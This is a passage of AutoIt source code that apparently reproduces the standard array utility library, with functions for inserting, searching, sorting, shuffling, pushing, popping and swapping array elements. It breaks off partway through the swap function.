Func _arrayinsert(ByRef $aarray, $vrange, $vvalue = "", $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
	If $vvalue = Default Then $vvalue = ""
	If $istart = Default Then $istart = 0
	If $sdelim_item = Default Then $sdelim_item = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $iforce = Default Then $iforce = $arrayfill_force_default
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	Local $hdatatype = 0
	Switch $iforce
		Case $arrayfill_force_int
			$hdatatype = Int
		Case $arrayfill_force_number
			$hdatatype = Number
		Case $arrayfill_force_ptr
			$hdatatype = Ptr
		Case $arrayfill_force_hwnd
			$hdatatype = HWnd
		Case $arrayfill_force_string
			$hdatatype = String
	EndSwitch
	Local $asplit_1, $asplit_2
	If IsArray($vrange) Then
		If UBound($vrange, $ubound_dimensions) <> 1 OR UBound($vrange, $ubound_rows) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $inumber
		$vrange = StringStripWS($vrange, 8)
		$asplit_1 = StringSplit($vrange, ";")
		$vrange = ""
		For $i = 1 To $asplit_1[0]
			If NOT StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$asplit_2 = StringSplit($asplit_1[$i], "-")
			Switch $asplit_2[0]
				Case 1
					$vrange &= $asplit_2[1] & ";"
				Case 2
					If Number($asplit_2[2]) >= Number($asplit_2[1]) Then
						$inumber = $asplit_2[1] - 1
						Do
							$inumber += 1
							$vrange &= $inumber & ";"
						Until $inumber = $asplit_2[2]
					EndIf
			EndSwitch
		Next
		$vrange = StringSplit(StringTrimRight($vrange, 1), ";")
	EndIf
	If $vrange[1] < 0 OR $vrange[$vrange[0]] > $idim_1 Then Return SetError(5, 0, -1)
	For $i = 2 To $vrange[0]
		If $vrange[$i] < $vrange[$i - 1] Then Return SetError(3, 0, -1)
	Next
	Local $icopyto_index = $idim_1 + $vrange[0]
	Local $iinsertpoint_index = $vrange[0]
	Local $iinsert_index = $vrange[$iinsertpoint_index]
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $iforce = $arrayfill_force_singleitem Then
				ReDim $aarray[$idim_1 + $vrange[0] + 1]
				For $ireadfromindex = $idim_1 To 0 Step -1
					$aarray[$icopyto_index] = $aarray[$ireadfromindex]
					$icopyto_index -= 1
					$iinsert_index = $vrange[$iinsertpoint_index]
					While $ireadfromindex = $iinsert_index
						$aarray[$icopyto_index] = $vvalue
						$icopyto_index -= 1
						$iinsertpoint_index -= 1
						If $iinsertpoint_index < 1 Then ExitLoop 2
						$iinsert_index = $vrange[$iinsertpoint_index]
					WEnd
				Next
				Return $idim_1 + $vrange[0] + 1
			EndIf
			ReDim $aarray[$idim_1 + $vrange[0] + 1]
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 1 Then Return SetError(5, 0, -1)
				$hdatatype = 0
			Else
				Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
				If UBound($atmp, $ubound_rows) = 1 Then
					$atmp[0] = $vvalue
					$hdatatype = 0
				EndIf
				$vvalue = $atmp
			EndIf
			For $ireadfromindex = $idim_1 To 0 Step -1
				$aarray[$icopyto_index] = $aarray[$ireadfromindex]
				$icopyto_index -= 1
				$iinsert_index = $vrange[$iinsertpoint_index]
				While $ireadfromindex = $iinsert_index
					If $iinsertpoint_index <= UBound($vvalue, $ubound_rows) Then
						If IsFunc($hdatatype) Then
							$aarray[$icopyto_index] = $hdatatype($vvalue[$iinsertpoint_index - 1])
						Else
							$aarray[$icopyto_index] = $vvalue[$iinsertpoint_index - 1]
						EndIf
					Else
						$aarray[$icopyto_index] = ""
					EndIf
					$icopyto_index -= 1
					$iinsertpoint_index -= 1
					If $iinsertpoint_index = 0 Then ExitLoop 2
					$iinsert_index = $vrange[$iinsertpoint_index]
				WEnd
			Next
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $istart < 0 OR $istart > $idim_2 - 1 Then Return SetError(6, 0, -1)
			Local $ivaldim_1, $ivaldim_2
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 2 Then Return SetError(7, 0, -1)
				$ivaldim_1 = UBound($vvalue, $ubound_rows)
				$ivaldim_2 = UBound($vvalue, $ubound_columns)
				$hdatatype = 0
			Else
				$asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
				$ivaldim_1 = UBound($asplit_1, $ubound_rows)
				StringReplace($asplit_1[0], $sdelim_item, "")
				$ivaldim_2 = @extended + 1
				Local $atmp[$ivaldim_1][$ivaldim_2]
				For $i = 0 To $ivaldim_1 - 1
					$asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
					For $j = 0 To $ivaldim_2 - 1
						$atmp[$i][$j] = $asplit_2[$j]
					Next
				Next
				$vvalue = $atmp
			EndIf
			If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(8, 0, -1)
			ReDim $aarray[$idim_1 + $vrange[0] + 1][$idim_2]
			For $ireadfromindex = $idim_1 To 0 Step -1
				For $j = 0 To $idim_2 - 1
					$aarray[$icopyto_index][$j] = $aarray[$ireadfromindex][$j]
				Next
				$icopyto_index -= 1
				$iinsert_index = $vrange[$iinsertpoint_index]
				While $ireadfromindex = $iinsert_index
					For $j = 0 To $idim_2 - 1
						If $j < $istart Then
							$aarray[$icopyto_index][$j] = ""
						ElseIf $j - $istart > $ivaldim_2 - 1 Then
							$aarray[$icopyto_index][$j] = ""
						Else
							If $iinsertpoint_index - 1 < $ivaldim_1 Then
								If IsFunc($hdatatype) Then
									$aarray[$icopyto_index][$j] = $hdatatype($vvalue[$iinsertpoint_index - 1][$j - $istart])
								Else
									$aarray[$icopyto_index][$j] = $vvalue[$iinsertpoint_index - 1][$j - $istart]
								EndIf
							Else
								$aarray[$icopyto_index][$j] = ""
							EndIf
						EndIf
					Next
					$icopyto_index -= 1
					$iinsertpoint_index -= 1
					If $iinsertpoint_index = 0 Then ExitLoop 2
					$iinsert_index = $vrange[$iinsertpoint_index]
				WEnd
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_rows)
EndFunc

Func _arraymax(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	Local $iresult = _arraymaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem)
	If @error Then Return SetError(@error, 0, "")
	If UBound($aarray, $ubound_dimensions) = 1 Then
		Return $aarray[$iresult]
	Else
		Return $aarray[$iresult][$isubitem]
	EndIf
EndFunc

Func _arraymaxindex(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If $isubitem = Default Then $isubitem = 0
	Local $iret = __array_minmaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem, __array_greaterthan)
	Return SetError(@error, 0, $iret)
EndFunc

Func _arraymin(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	Local $iresult = _arrayminindex($aarray, $icompnumeric, $istart, $iend, $isubitem)
	If @error Then Return SetError(@error, 0, "")
	If UBound($aarray, $ubound_dimensions) = 1 Then
		Return $aarray[$iresult]
	Else
		Return $aarray[$iresult][$isubitem]
	EndIf
EndFunc

Func _arrayminindex(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If $isubitem = Default Then $isubitem = 0
	Local $iret = __array_minmaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem, __array_lessthan)
	Return SetError(@error, 0, $iret)
EndFunc

Func _arraypermute(ByRef $aarray, $sdelimiter = "")
	If $sdelimiter = Default Then $sdelimiter = ""
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, 0)
	Local $isize = UBound($aarray), $ifactorial = 1, $aidx[$isize], $aresult[1], $icount = 1
	If UBound($aarray) Then
		For $i = 0 To $isize - 1
			$aidx[$i] = $i
		Next
		For $i = $isize To 1 Step -1
			$ifactorial *= $i
		Next
		ReDim $aresult[$ifactorial + 1]
		$aresult[0] = $ifactorial
		__array_exeterinternal($aarray, 0, $isize, $sdelimiter, $aidx, $aresult, $icount)
	Else
		$aresult[0] = 0
	EndIf
	Return $aresult
EndFunc

Func _arraypop(ByRef $aarray)
	If (NOT IsArray($aarray)) Then Return SetError(1, 0, "")
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, "")
	Local $iubound = UBound($aarray) - 1
	If $iubound = -1 Then Return SetError(3, 0, "")
	Local $slastval = $aarray[$iubound]
	If $iubound > -1 Then
		ReDim $aarray[$iubound]
	EndIf
	Return $slastval
EndFunc

Func _arraypush(ByRef $aarray, $vvalue, $idirection = 0)
	If $idirection = Default Then $idirection = 0
	If (NOT IsArray($aarray)) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(3, 0, 0)
	Local $iubound = UBound($aarray) - 1
	If IsArray($vvalue) Then
		Local $iubounds = UBound($vvalue)
		If ($iubounds - 1) > $iubound Then Return SetError(2, 0, 0)
		If $idirection Then
			For $i = $iubound To $iubounds Step -1
				$aarray[$i] = $aarray[$i - $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$aarray[$i] = $vvalue[$i]
			Next
		Else
			For $i = 0 To $iubound - $iubounds
				$aarray[$i] = $aarray[$i + $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$aarray[$i + $iubound - $iubounds + 1] = $vvalue[$i]
			Next
		EndIf
	Else
		If $iubound > -1 Then
			If $idirection Then
				For $i = $iubound To 1 Step -1
					$aarray[$i] = $aarray[$i - 1]
				Next
				$aarray[0] = $vvalue
			Else
				For $i = 0 To $iubound - 1
					$aarray[$i] = $aarray[$i + 1]
				Next
				$aarray[$iubound] = $vvalue
			EndIf
		EndIf
	EndIf
	Return 1
EndFunc

Func _arrayreverse(ByRef $aarray, $istart = 0, $iend = 0)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(3, 0, 0)
	If NOT UBound($aarray) Then Return SetError(4, 0, 0)
	Local $vtmp, $iubound = UBound($aarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	For $i = $istart To Int(($istart + $iend - 1) / 2)
		$vtmp = $aarray[$i]
		$aarray[$i] = $aarray[$iend]
		$aarray[$iend] = $vtmp
		$iend -= 1
	Next
	Return 1
EndFunc

Func _arraysearch(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1, $brow = False)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icase = Default Then $icase = 0
	If $icompare = Default Then $icompare = 0
	If $iforward = Default Then $iforward = 1
	If $isubitem = Default Then $isubitem = -1
	If $brow = Default Then $brow = False
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray) - 1
	If $idim_1 = -1 Then Return SetError(3, 0, -1)
	Local $idim_2 = UBound($aarray, $ubound_columns) - 1
	Local $bcomptype = False
	If $icompare = 2 Then
		$icompare = 0
		$bcomptype = True
	EndIf
	If $brow Then
		If UBound($aarray, $ubound_dimensions) = 1 Then Return SetError(5, 0, -1)
		If $iend < 1 OR $iend > $idim_2 Then $iend = $idim_2
		If $istart < 0 Then $istart = 0
		If $istart > $iend Then Return SetError(4, 0, -1)
	Else
		If $iend < 1 OR $iend > $idim_1 Then $iend = $idim_1
		If $istart < 0 Then $istart = 0
		If $istart > $iend Then Return SetError(4, 0, -1)
	EndIf
	Local $istep = 1
	If NOT $iforward Then
		Local $itmp = $istart
		$istart = $iend
		$iend = $itmp
		$istep = -1
	EndIf
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If NOT $icompare Then
				If NOT $icase Then
					For $i = $istart To $iend Step $istep
						If $bcomptype AND VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $aarray[$i] = $vvalue Then Return $i
					Next
				Else
					For $i = $istart To $iend Step $istep
						If $bcomptype AND VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $aarray[$i] == $vvalue Then Return $i
					Next
				EndIf
			Else
				For $i = $istart To $iend Step $istep
					If $icompare = 3 Then
						If StringRegExp($aarray[$i], $vvalue) Then Return $i
					Else
						If StringInStr($aarray[$i], $vvalue, $icase) > 0 Then Return $i
					EndIf
				Next
			EndIf
		Case 2
			Local $idim_sub
			If $brow Then
				$idim_sub = $idim_1
				If $isubitem > $idim_sub Then $isubitem = $idim_sub
				If $isubitem < 0 Then
					$isubitem = 0
				Else
					$idim_sub = $isubitem
				EndIf
			Else
				$idim_sub = $idim_2
				If $isubitem > $idim_sub Then $isubitem = $idim_sub
				If $isubitem < 0 Then
					$isubitem = 0
				Else
					$idim_sub = $isubitem
				EndIf
			EndIf
			For $j = $isubitem To $idim_sub
				If NOT $icompare Then
					If NOT $icase Then
						For $i = $istart To $iend Step $istep
							If $brow Then
								If $bcomptype AND VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$j][$i] = $vvalue Then Return $i
							Else
								If $bcomptype AND VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$i][$j] = $vvalue Then Return $i
							EndIf
						Next
					Else
						For $i = $istart To $iend Step $istep
							If $brow Then
								If $bcomptype AND VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$j][$i] == $vvalue Then Return $i
							Else
								If $bcomptype AND VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$i][$j] == $vvalue Then Return $i
							EndIf
						Next
					EndIf
				Else
					For $i = $istart To $iend Step $istep
						If $icompare = 3 Then
							If $brow Then
								If StringRegExp($aarray[$j][$i], $vvalue) Then Return $i
							Else
								If StringRegExp($aarray[$i][$j], $vvalue) Then Return $i
							EndIf
						Else
							If $brow Then
								If StringInStr($aarray[$j][$i], $vvalue, $icase) > 0 Then Return $i
							Else
								If StringInStr($aarray[$i][$j], $vvalue, $icase) > 0 Then Return $i
							EndIf
						EndIf
					Next
				EndIf
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return SetError(6, 0, -1)
EndFunc

Func _arrayshuffle(ByRef $aarray, $istart_row = 0, $iend_row = 0, $icol = -1)
	If $istart_row = Default Then $istart_row = 0
	If $iend_row = Default Then $iend_row = 0
	If $icol = Default Then $icol = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If $iend_row = 0 Then $iend_row = $idim_1 - 1
	If $istart_row < 0 OR $istart_row > $idim_1 - 1 Then Return SetError(3, 0, -1)
	If $iend_row < 1 OR $iend_row > $idim_1 - 1 Then Return SetError(3, 0, -1)
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Local $vtmp, $irand
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = $iend_row To $istart_row + 1 Step -1
				$irand = Random($istart_row, $i, 1)
				$vtmp = $aarray[$i]
				$aarray[$i] = $aarray[$irand]
				$aarray[$irand] = $vtmp
			Next
			Return 1
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $icol < -1 OR $icol > $idim_2 - 1 Then Return SetError(5, 0, -1)
			Local $icol_start, $icol_end
			If $icol = -1 Then
				$icol_start = 0
				$icol_end = $idim_2 - 1
			Else
				$icol_start = $icol
				$icol_end = $icol
			EndIf
			For $i = $iend_row To $istart_row + 1 Step -1
				$irand = Random($istart_row, $i, 1)
				For $j = $icol_start To $icol_end
					$vtmp = $aarray[$i][$j]
					$aarray[$i][$j] = $aarray[$irand][$j]
					$aarray[$irand][$j] = $vtmp
				Next
			Next
			Return 1
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
EndFunc

Func _arraysort(ByRef $aarray, $idescending = 0, $istart = 0, $iend = 0, $isubitem = 0, $ipivot = 0)
	If $idescending = Default Then $idescending = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If $ipivot = Default Then $ipivot = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($aarray) - 1
	If $iubound = -1 Then Return SetError(5, 0, 0)
	If $iend = Default Then $iend = 0
	If $iend < 1 OR $iend > $iubound OR $iend = Default Then $iend = $iubound
	If $istart < 0 OR $istart = Default Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $ipivot Then
				__arraydualpivotsort($aarray, $istart, $iend)
			Else
				__arrayquicksort1d($aarray, $istart, $iend)
			EndIf
			If $idescending Then _arrayreverse($aarray, $istart, $iend)
		Case 2
			If $ipivot Then Return SetError(6, 0, 0)
			Local $isubmax = UBound($aarray, $ubound_columns) - 1
			If $isubitem > $isubmax Then Return SetError(3, 0, 0)
			If $idescending Then
				$idescending = -1
			Else
				$idescending = 1
			EndIf
			__arrayquicksort2d($aarray, $idescending, $istart, $iend, $isubitem, $isubmax)
		Case Else
			Return SetError(4, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func __arrayquicksort1d(ByRef $aarray, Const ByRef $istart, Const ByRef $iend)
	If $iend <= $istart Then Return 
	Local $vtmp
	If ($iend - $istart) < 15 Then
		Local $vcur
		For $i = $istart + 1 To $iend
			$vtmp = $aarray[$i]
			If IsNumber($vtmp) Then
				For $j = $i - 1 To $istart Step -1
					$vcur = $aarray[$j]
					If ($vtmp >= $vcur AND IsNumber($vcur)) OR (NOT IsNumber($vcur) AND StringCompare($vtmp, $vcur) >= 0) Then ExitLoop
					$aarray[$j + 1] = $vcur
				Next
			Else
				For $j = $i - 1 To $istart Step -1
					If (StringCompare($vtmp, $aarray[$j]) >= 0) Then ExitLoop
					$aarray[$j + 1] = $aarray[$j]
				Next
			EndIf
			$aarray[$j + 1] = $vtmp
		Next
		Return 
	EndIf
	Local $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 2)], $bnum = IsNumber($vpivot)
	Do
		If $bnum Then
			While ($aarray[$l] < $vpivot AND IsNumber($aarray[$l])) OR (NOT IsNumber($aarray[$l]) AND StringCompare($aarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While ($aarray[$r] > $vpivot AND IsNumber($aarray[$r])) OR (NOT IsNumber($aarray[$r]) AND StringCompare($aarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While (StringCompare($aarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While (StringCompare($aarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			$vtmp = $aarray[$l]
			$aarray[$l] = $aarray[$r]
			$aarray[$r] = $vtmp
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort1d($aarray, $istart, $r)
	__arrayquicksort1d($aarray, $l, $iend)
EndFunc

Func __arrayquicksort2d(ByRef $aarray, Const ByRef $istep, Const ByRef $istart, Const ByRef $iend, Const ByRef $isubitem, Const ByRef $isubmax)
	If $iend <= $istart Then Return 
	Local $vtmp, $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 2)][$isubitem], $bnum = IsNumber($vpivot)
	Do
		If $bnum Then
			While ($istep * ($aarray[$l][$isubitem] - $vpivot) < 0 AND IsNumber($aarray[$l][$isubitem])) OR (NOT IsNumber($aarray[$l][$isubitem]) AND $istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * ($aarray[$r][$isubitem] - $vpivot) > 0 AND IsNumber($aarray[$r][$isubitem])) OR (NOT IsNumber($aarray[$r][$isubitem]) AND $istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While ($istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			For $i = 0 To $isubmax
				$vtmp = $aarray[$l][$i]
				$aarray[$l][$i] = $aarray[$r][$i]
				$aarray[$r][$i] = $vtmp
			Next
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort2d($aarray, $istep, $istart, $r, $isubitem, $isubmax)
	__arrayquicksort2d($aarray, $istep, $l, $iend, $isubitem, $isubmax)
EndFunc

Func __arraydualpivotsort(ByRef $aarray, $ipivot_left, $ipivot_right, $bleftmost = True)
	If $ipivot_left > $ipivot_right Then Return 
	Local $ilength = $ipivot_right - $ipivot_left + 1
	Local $i, $j, $k, $iai, $iak, $ia1, $ia2, $ilast
	If $ilength < 45 Then
		If $bleftmost Then
			$i = $ipivot_left
			While $i < $ipivot_right
				$j = $i
				$iai = $aarray[$i + 1]
				While $iai < $aarray[$j]
					$aarray[$j + 1] = $aarray[$j]
					$j -= 1
					If $j + 1 = $ipivot_left Then ExitLoop
				WEnd
				$aarray[$j + 1] = $iai
				$i += 1
			WEnd
		Else
			While 1
				If $ipivot_left >= $ipivot_right Then Return 1
				$ipivot_left += 1
				If $aarray[$ipivot_left] < $aarray[$ipivot_left - 1] Then ExitLoop
			WEnd
			While 1
				$k = $ipivot_left
				$ipivot_left += 1
				If $ipivot_left > $ipivot_right Then ExitLoop
				$ia1 = $aarray[$k]
				$ia2 = $aarray[$ipivot_left]
				If $ia1 < $ia2 Then
					$ia2 = $ia1
					$ia1 = $aarray[$ipivot_left]
				EndIf
				$k -= 1
				While $ia1 < $aarray[$k]
					$aarray[$k + 2] = $aarray[$k]
					$k -= 1
				WEnd
				$aarray[$k + 2] = $ia1
				While $ia2 < $aarray[$k]
					$aarray[$k + 1] = $aarray[$k]
					$k -= 1
				WEnd
				$aarray[$k + 1] = $ia2
				$ipivot_left += 1
			WEnd
			$ilast = $aarray[$ipivot_right]
			$ipivot_right -= 1
			While $ilast < $aarray[$ipivot_right]
				$aarray[$ipivot_right + 1] = $aarray[$ipivot_right]
				$ipivot_right -= 1
			WEnd
			$aarray[$ipivot_right + 1] = $ilast
		EndIf
		Return 1
	EndIf
	Local $iseventh = BitShift($ilength, 3) + BitShift($ilength, 6) + 1
	Local $ie1, $ie2, $ie3, $ie4, $ie5, $t
	$ie3 = Ceiling(($ipivot_left + $ipivot_right) / 2)
	$ie2 = $ie3 - $iseventh
	$ie1 = $ie2 - $iseventh
	$ie4 = $ie3 + $iseventh
	$ie5 = $ie4 + $iseventh
	If $aarray[$ie2] < $aarray[$ie1] Then
		$t = $aarray[$ie2]
		$aarray[$ie2] = $aarray[$ie1]
		$aarray[$ie1] = $t
	EndIf
	If $aarray[$ie3] < $aarray[$ie2] Then
		$t = $aarray[$ie3]
		$aarray[$ie3] = $aarray[$ie2]
		$aarray[$ie2] = $t
		If $t < $aarray[$ie1] Then
			$aarray[$ie2] = $aarray[$ie1]
			$aarray[$ie1] = $t
		EndIf
	EndIf
	If $aarray[$ie4] < $aarray[$ie3] Then
		$t = $aarray[$ie4]
		$aarray[$ie4] = $aarray[$ie3]
		$aarray[$ie3] = $t
		If $t < $aarray[$ie2] Then
			$aarray[$ie3] = $aarray[$ie2]
			$aarray[$ie2] = $t
			If $t < $aarray[$ie1] Then
				$aarray[$ie2] = $aarray[$ie1]
				$aarray[$ie1] = $t
			EndIf
		EndIf
	EndIf
	If $aarray[$ie5] < $aarray[$ie4] Then
		$t = $aarray[$ie5]
		$aarray[$ie5] = $aarray[$ie4]
		$aarray[$ie4] = $t
		If $t < $aarray[$ie3] Then
			$aarray[$ie4] = $aarray[$ie3]
			$aarray[$ie3] = $t
			If $t < $aarray[$ie2] Then
				$aarray[$ie3] = $aarray[$ie2]
				$aarray[$ie2] = $t
				If $t < $aarray[$ie1] Then
					$aarray[$ie2] = $aarray[$ie1]
					$aarray[$ie1] = $t
				EndIf
			EndIf
		EndIf
	EndIf
	Local $iless = $ipivot_left
	Local $igreater = $ipivot_right
	If (($aarray[$ie1] <> $aarray[$ie2]) AND ($aarray[$ie2] <> $aarray[$ie3]) AND ($aarray[$ie3] <> $aarray[$ie4]) AND ($aarray[$ie4] <> $aarray[$ie5])) Then
		Local $ipivot_1 = $aarray[$ie2]
		Local $ipivot_2 = $aarray[$ie4]
		$aarray[$ie2] = $aarray[$ipivot_left]
		$aarray[$ie4] = $aarray[$ipivot_right]
		Do
			$iless += 1
		Until $aarray[$iless] >= $ipivot_1
		Do
			$igreater -= 1
		Until $aarray[$igreater] <= $ipivot_2
		$k = $iless
		While $k <= $igreater
			$iak = $aarray[$k]
			If $iak < $ipivot_1 Then
				$aarray[$k] = $aarray[$iless]
				$aarray[$iless] = $iak
				$iless += 1
			ElseIf $iak > $ipivot_2 Then
				While $aarray[$igreater] > $ipivot_2
					$igreater -= 1
					If $igreater + 1 = $k Then ExitLoop 2
				WEnd
				If $aarray[$igreater] < $ipivot_1 Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $aarray[$igreater]
					$iless += 1
				Else
					$aarray[$k] = $aarray[$igreater]
				EndIf
				$aarray[$igreater] = $iak
				$igreater -= 1
			EndIf
			$k += 1
		WEnd
		$aarray[$ipivot_left] = $aarray[$iless - 1]
		$aarray[$iless - 1] = $ipivot_1
		$aarray[$ipivot_right] = $aarray[$igreater + 1]
		$aarray[$igreater + 1] = $ipivot_2
		__arraydualpivotsort($aarray, $ipivot_left, $iless - 2, True)
		__arraydualpivotsort($aarray, $igreater + 2, $ipivot_right, False)
		If ($iless < $ie1) AND ($ie5 < $igreater) Then
			While $aarray[$iless] = $ipivot_1
				$iless += 1
			WEnd
			While $aarray[$igreater] = $ipivot_2
				$igreater -= 1
			WEnd
			$k = $iless
			While $k <= $igreater
				$iak = $aarray[$k]
				If $iak = $ipivot_1 Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $iak
					$iless += 1
				ElseIf $iak = $ipivot_2 Then
					While $aarray[$igreater] = $ipivot_2
						$igreater -= 1
						If $igreater + 1 = $k Then ExitLoop 2
					WEnd
					If $aarray[$igreater] = $ipivot_1 Then
						$aarray[$k] = $aarray[$iless]
						$aarray[$iless] = $ipivot_1
						$iless += 1
					Else
						$aarray[$k] = $aarray[$igreater]
					EndIf
					$aarray[$igreater] = $iak
					$igreater -= 1
				EndIf
				$k += 1
			WEnd
		EndIf
		__arraydualpivotsort($aarray, $iless, $igreater, False)
	Else
		Local $ipivot = $aarray[$ie3]
		$k = $iless
		While $k <= $igreater
			If $aarray[$k] = $ipivot Then
				$k += 1
				ContinueLoop
			EndIf
			$iak = $aarray[$k]
			If $iak < $ipivot Then
				$aarray[$k] = $aarray[$iless]
				$aarray[$iless] = $iak
				$iless += 1
			Else
				While $aarray[$igreater] > $ipivot
					$igreater -= 1
				WEnd
				If $aarray[$igreater] < $ipivot Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $aarray[$igreater]
					$iless += 1
				Else
					$aarray[$k] = $ipivot
				EndIf
				$aarray[$igreater] = $iak
				$igreater -= 1
			EndIf
			$k += 1
		WEnd
		__arraydualpivotsort($aarray, $ipivot_left, $iless - 1, True)
		__arraydualpivotsort($aarray, $igreater + 1, $ipivot_right, False)
	EndIf
EndFunc

Func _arrayswap(ByRef $aarray, $iindex_1, $iindex_2, $bcol = False, $istart = -1, $iend = -1)
	If $bcol = Default Then $bcol = False
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	Local $idim_2 = UBound($aarray, $ubound_columns) - 1
	If $idim_2 = -1 Then
		$bcol = False
		$istart = -1
		$iend = -1
	EndIf
	If $istart > $iend Then Return SetError(5, 0, -1)
	If $bcol Then
		If $iindex_1 < 0 OR $iindex_2 > $idim_2 Then Return SetError(3, 0, -1)
		If $istart = -1 Then $istart = 0
		If $iend = -1 Then $iend = $idim_1
	Else
		If $iindex_1 < 0 OR $iindex_2 > $idim_1 Then Return SetError(3, 0, -1)
		If $istart = -1 Then $istart = 0
		If $iend = -1 Then $iend = $idim_2
	EndIf
	Local $vtmp
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			$vtmp = $aarray[$iindex_1]
			$aarray[$iindex_1] = $aarray[$iindex_2]
			$aarray[$iindex_2] = $vtmp
		Case 2
			If $istart < -1 OR $iend < -1 Then Return SetError(4, 0, -1)
			If $bcol Then
				If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(4, 0, -1)
				For $j = $istart To $iend
					$vtmp = $aarray[$j][$iindex_1]
					$aarray[$j][$iindex_1] = $aarray[$j][$iindex_2]
					$aarray[$j][$iindex_2] = $vtmp
				Next
			Else
				If $istart > $idim_2 OR $iend > $idim_2 Then Return SetError(4, 0, -1)
				For $j = $istart To $iend
					$vtmp = $aarray[$iindex_1][$j]
					$aarray[$iindex_1][$j] = $aarray[$iindex_2][$j]
					$aarray[$iindex_2][$j] = $vtmp
				Next
			EndIf
